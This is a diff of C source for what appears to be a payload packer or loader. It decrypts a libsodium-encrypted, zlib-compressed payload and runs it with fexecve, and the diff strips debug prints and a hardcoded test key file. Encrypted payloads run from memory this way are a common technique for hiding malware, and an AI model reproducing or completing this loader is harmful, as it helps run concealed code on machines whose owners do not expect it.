@@ -20,7 +20,6 @@ int executePayload(int payload_fd, char **payload_argv, char **payload_envp)
 {
     if (fexecve(payload_fd, (char *const *)payload_argv, (char *const *)payload_envp) == -1)
     { // execute payload
-        puts("fexecve() failed");
         return 0;
     }
     return 1;
@@ -36,12 +35,10 @@ void writeToDisk(void *payload, char *pathToWrite, int size)
     fclose(outfile);
 }
 
-unsigned char *decrypt(unsigned char *encrypted, unsigned int input_length, unsigned int original_size)
+unsigned char *decrypt(unsigned char *encrypted, unsigned int input_length, unsigned int original_size, unsigned char *key)
 {
     unsigned char encrypted_msg[input_length - 24];
     unsigned char nonce[24];
-    unsigned char key[crypto_secretbox_KEYBYTES];
-    FILE *fp_k;
 
     const unsigned int ciphertext_len = original_size + 16;
 
@@ -51,19 +48,6 @@ unsigned char *decrypt(unsigned char *encrypted, unsigned int input_length, unsi
     {
         return NULL;
     }
-    // to delete in final
-    if ((fp_k = fopen("../test_files/secret-key", "rb")) == NULL)
-    {
-        return NULL;
-    }
-
-    if (fread(key, sizeof(unsigned char), crypto_secretbox_KEYBYTES, fp_k) != crypto_secretbox_KEYBYTES)
-    {
-        return NULL;
-    }
-
-    fclose(fp_k);
-    //end to delete in final
 
     for (int i = 0; i < input_length; i++)
     {
@@ -95,50 +79,53 @@ unsigned char *decompress(unsigned char *decrypted, uLong uncomp_len, uLong comp
     return uncompressed;
 }
 
-unsigned int getUncompLen(unsigned char *payload){
+unsigned int getUncompLen(unsigned char *payload)
+{
     unsigned int toRet = (payload[0] | payload[1] << 8 | payload[2] << 16 | payload[3] << 24);
     return toRet;
 }
 
-unsigned int getDecryptedLen(unsigned char *payload){
+unsigned int getDecryptedLen(unsigned char *payload)
+{
     unsigned int toRet = (payload[4] | payload[5] << 8 | payload[6] << 16 | payload[7] << 24);
     return toRet;
 }
 
-unsigned int getEncLen(unsigned char *payload){
+unsigned int getEncLen(unsigned char *payload)
+{
     unsigned int toRet = (payload[8] | payload[9] << 8 | payload[10] << 16 | payload[11] << 24);
     return toRet;
 }
 
-unsigned int getNumPayloads(unsigned char *payload){
+unsigned int getNumPayloads(unsigned char *payload)
+{
     unsigned int toRet = (payload[0] | payload[1] << 8 | payload[2] << 16 | payload[3] << 24);
     return toRet;
 }
 
-char *psswdPadding(){
+unsigned char *psswdPadding()
+{
     int len;
     char pad = '#';
-    char * psswd = malloc(32);
+    unsigned char *psswd = malloc(32);
 
-    if(psswd == NULL){
+    if (psswd == NULL)
+    {
         return NULL;
     }
 
     len = strlen(ENC_PASSWORD);
-    printf("Password length: %d\n", len);
 
     //add padding if necessary
-    if(len < 32){
+    if (len < 32)
+    {
         memcpy(psswd, ENC_PASSWORD, len);
         memset(psswd + len, pad, 32 - len);
     }
-    else{
+    else
+    {
         memcpy(psswd, ENC_PASSWORD, 32);
     }
-
-    //Just checking
-    len = strlen(psswd);
-    printf("Password length: %d\nPassword: %s\n", len, psswd);
 
     return psswd;
 }
